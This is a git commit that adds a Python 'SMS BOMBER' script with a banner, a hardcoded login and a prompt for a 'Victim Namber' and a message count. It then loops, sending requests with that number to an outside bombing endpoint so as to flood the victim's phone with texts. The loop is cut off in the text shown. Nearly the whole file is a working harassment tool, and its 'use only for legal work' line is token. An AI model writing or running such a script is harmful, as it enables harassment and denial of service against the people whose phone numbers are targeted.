78fd6aba278d0585fc6a20ad8b363c42598bf10c
RF PROGRAMMING HUB <arafathasib74@gmail.com>
2025-08-15 21:33:32 +0600

    Add files via upload

---
+++ SMS_BOOM.py
@@ -0,0 +1,64 @@
+import os
+import time
+
+os.system("clear")
+time.sleep(0.5)
+
+print("""
+
+\033[1;34m
+
+██████  ███████      ██████ ██    ██ ██████  ███████ ██████      ███████ ██████   ██████   ██████ ███████ 
+██   ██ ██          ██       ██  ██  ██   ██ ██      ██   ██     ██      ██   ██ ██    ██ ██      ██      
+██████  █████       ██        ████   ██████  █████   ██████      █████   ██████  ██    ██ ██      █████   
+██   ██ ██          ██         ██    ██   ██ ██      ██   ██     ██      ██   ██ ██    ██ ██      ██      
+██   ██ ██           ██████    ██    ██████  ███████ ██   ██     ██      ██   ██  ██████   ██████ ███████ 
+                                                                      
+                                                                          
+\033[1;32m______________________________________________________________
+Wellcome to Our Powerful SMS BOMBER Toos🔥
+This Tools Developer By MD HASIB
+______________________________________________________________
+                                                                                                                                                                                                                                    \033[1;35m                                                ========================================================
+Tools Owner  :\033[1;33mMD HASIB 
+Team         :\033[1;36mRF CYBER FROCE 
+GitHub       :\033[1;32mhttps://github.com/Hasibvirus
+Email        :\033[1;36mrfprogramminghub@gmail.com
+\033[1;31mUse Only for legal work Not Use For Ilegal work
+
+\033[1;35m ========================================================                                                               
+""")
+
+import sys
+use=input("Enter Username :")
+pas=input("Enter Password :")
+
+if use=="SMS BOMBER" and pas=="MD HASIB":
+    print("Login Successful..")
+else:
+        print("username or password wrong please try again")
+        sys.exit()
+        
+import os
+import time
+
+os.system("clear")
+time.sleep(0.3)
+
+              
+import requests 
+
+namber=input('\033[1;32mEnter Victim Namber :')
+amount=int(input("Enter Amount :"))
+sent=0
+
+while sent<amount:
+    
+   a=requests.get("https://davicagra.co.in/bb.php?num="+namber)                                                                                                       
+                                                                                                       
+                                                                                                       
+                                                                                                       
+                                                                                                       
+                                                                                                       
+                                                                                                       
+                                                                                                                      
